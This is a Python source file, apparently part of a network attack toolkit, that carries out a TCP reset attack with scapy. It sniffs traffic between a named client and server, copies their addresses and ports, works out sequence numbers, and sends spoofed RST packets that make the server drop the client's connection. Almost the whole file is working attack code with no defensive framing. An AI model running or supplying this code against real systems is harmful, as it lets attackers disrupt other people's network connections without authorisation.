#!/usr/bin/env python3
from scapy.all import *
from .Client import Client, NetAttrs


# giving usage information
def reset_usage(exit_num=None):
    usg = "Run a TCP reset attack. Disconnects client from server by spoofing\n"
    usg += "a reset packet from the client to the server. This will cause the\n"
    usg += "server to drop packets from the client\n\n"
    usg += "Requires: Server/Client IP, Interface"
    print(usg)


# run attack
def tcp_reset(client, src, dst, tcp_rst_count=5):
    fin_found = 0
    _, l1, l2 = client.gen_layers(src=src, dst=dst, tcp=True)
    p = l1 / l2
    client.add_options(p, {'TCP': {'flags': 'R'}})

    while fin_found != 2:
        # capturing a packet with the source and destination provided
        print('Capturing Packet')
        pack = sniff(
            iface=client.intface,
            count=1,
            lfilter=lambda x: x.haslayer(TCP) and x.haslayer(Raw) and x[IP].src
            == src.ip and x[IP].dst == dst.ip and len(x[TCP].payload) > 0)[0]
        print('Packet Found')

        # generating spoofed packets
        if fin_found == 0:
            t = {}
            if src.mac is None or dst.mac is None:
                t['Ether'] = {'src': pack[Ether].src, 'dst': pack[Ether].dst}
            if src.port is None or dst.port is None:
                t['TCP'] = {'sport': pack[TCP].sport, 'dport': pack[TCP].dport}
            client.add_options(p, t)

        # calculating sequence numbers
        max_seq = pack[TCP].seq + tcp_rst_count * pack[TCP].window
        seqs = range(pack[TCP].seq, max_seq, len(pack[TCP].payload))[1:]

        # sending spoofed packets with calculated seq num
        print('Sending Reset')
        for seq in seqs:
            p.seq = seq
            send(p, verbose=0)
        print('Reset Sent')
        # check if fin packet is found
        fin_found = 2
